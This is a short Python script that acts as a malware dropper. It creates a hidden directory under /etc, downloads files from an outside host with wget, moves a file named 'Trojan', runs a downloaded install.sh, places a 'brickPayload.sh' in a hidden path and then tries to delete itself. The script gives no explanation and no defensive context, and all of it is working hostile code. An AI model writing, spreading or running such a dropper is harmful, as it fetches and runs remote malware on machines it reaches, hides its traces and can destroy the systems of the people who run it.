import os
import subprocess
def main():
    os.system("mkdir /etc/.a")
    os.system("wget -P /etc/.a -r -l 1 https://files.ravenn.net/horror")
    os.system("mv /etc/.a/files.ravenn.net/horror/Trojan /etc/.a")
    os.system("chmod +x /etc/.a/install.sh")
    os.system("bash /etc/.a/install.sh")
    os.system("mv /etc/.a/horror/brickPayload.sh /etc/.music")
    os.system("rm -- \"$0\"")
main()